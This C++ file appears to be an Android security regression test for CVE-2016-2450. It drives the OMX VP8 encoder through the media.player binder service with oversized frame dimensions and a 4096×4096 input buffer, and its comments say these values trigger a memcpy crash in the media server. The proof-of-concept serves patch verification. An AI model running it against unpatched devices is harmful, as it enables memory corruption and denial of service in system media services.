/*
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

#define LOG_TAG "CVE-2016-2450"

#include "OMX_Component.h"
#include <SharedMemoryBuffer.h>
#include <binder/IBinder.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <media/OMXBuffer.h>
#include <media/stagefright/foundation/AMessage.h>
#include <utils/String16.h>
#include <utils/StrongPointer.h>

using namespace android;

struct DummyOMXObserver : public BnOMXObserver {
public:
  DummyOMXObserver() {}

  virtual void onMessages(const std::list<omx_message> &messages __unused) {}

protected:
  virtual ~DummyOMXObserver() {}
};

int main() {
  sp<IServiceManager> sm = defaultServiceManager();

  sp<IBinder> binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> mediaPlayerService =
      interface_cast<IMediaPlayerService>(binder);

  if (mediaPlayerService == NULL) {
    ALOGE("mediaPlayerService == NULL");
    return -1;
  }

  sp<IOMX> service = mediaPlayerService->getOMX();
  if (service == NULL) {
    ALOGE("service == NULL");
    return -1;
  }

  IOMX::buffer_id inBufferId = 0;
  IOMX::buffer_id outBufferId = 0;
  sp<IOMXNode> node = 0;
  int fenceFd = -1;

  sp<DummyOMXObserver> observer = new DummyOMXObserver();

  char *name = (char *)"OMX.google.vp8.encoder";
  status_t err = service->allocateNode(name, observer, &node);
  if (err != OK) {
    ALOGE("%s node allocation fails", name);
    return -1;
  }
  // change state from loaded to idle
  err = node->sendCommand(OMX_CommandStateSet, 2);
  ALOGI("sendCommand, err: %d", err);

  int paramsSize = sizeof(OMX_PARAM_PORTDEFINITIONTYPE);
  OMX_PARAM_PORTDEFINITIONTYPE *params = (OMX_PARAM_PORTDEFINITIONTYPE *)malloc(
      sizeof(OMX_PARAM_PORTDEFINITIONTYPE));
  if (params == NULL) {
    ALOGE("memory allocation failed , err: %d", err);
    node->freeNode();
    return -1;
  }
  memset(params, 0, sizeof(OMX_PARAM_PORTDEFINITIONTYPE));
  params->nBufferCountActual = 1;
  params->nBufferCountMin = 1;
  params->nPortIndex = 0; // input
  params->nSize = sizeof(OMX_PARAM_PORTDEFINITIONTYPE);

  params->format.video.nFrameWidth = 2000;
  params->format.video.nFrameHeight = 2000;

  err = node->setParameter(OMX_IndexParamPortDefinition, params, paramsSize);
  ALOGI("setParameter, err: %d", err);
  // the following config triggers memcpy crash.
  // if change the inBufferSize, nFrameWidth and nFrameHeight to small values,
  // NPD would be triggerd.
  int inBufferSize = 4096 * 4096; // As per the document
  int outBufferSize = 4096;        // As per the document

  android::OMXBuffer omxBuf;

  sp<MemoryDealer> dealerIn = new MemoryDealer(inBufferSize);
  sp<MemoryDealer> dealerOut = new MemoryDealer(outBufferSize);

  sp<android::IMemory> memory = dealerIn->allocate(inBufferSize);
  if (memory.get() == NULL || memory->pointer() == NULL) {
    ALOGE("memory allocate failed for port index 0, err: %d", err);
    node->freeNode();
    free(params);
    return -1;
  }
  OMXBuffer omxInBuf(memory);
  memset(memory->pointer(), 0xCF, inBufferSize);
  err = node->useBuffer(0, omxInBuf, &inBufferId);
  ALOGI("useBuffer 0, port index 0, err: %d", err);

  sp<AMessage> inputFormat = new AMessage;
  sp<MediaCodecBuffer> codecData;
  codecData = new SharedMemoryBuffer(inputFormat, memory);
  OMXBuffer omxInBufShared(codecData);

  memory = dealerOut->allocate(outBufferSize);
  if (memory.get() == NULL || memory->pointer() == NULL) {
    ALOGE("memory allocate failed for port index 0, err: %d", err);
    node->freeNode();
    free(params);
    return -1;
  }

  OMXBuffer omxOutBuf(memory);
  err = node->useBuffer(1, omxOutBuf, &outBufferId);
  ALOGI("useBuffer 0, port index 1, err: %d", err);

  sp<AMessage> outputFormat = new AMessage;
  sp<MediaCodecBuffer> codecDataOut;
  codecDataOut = new SharedMemoryBuffer(outputFormat, memory);
  OMXBuffer omxOutBufShared(codecDataOut);

  // change state from idle to executing
  err = node->sendCommand(OMX_CommandStateSet, 3);
  ALOGI("sendCommand, err: %d", err);

  // fill buffer
  err = node->emptyBuffer(inBufferId, omxInBufShared, 0, 0, fenceFd);
  ALOGI("emptyBuffer, err: %d", err);

  err = node->fillBuffer(outBufferId, omxOutBufShared, fenceFd);
  ALOGI("fillBuffer, err: %d", err);

  // free node
  err = node->freeNode();
  ALOGI("freeNode, err: %d", err);
  free(params);
  return 0;
}
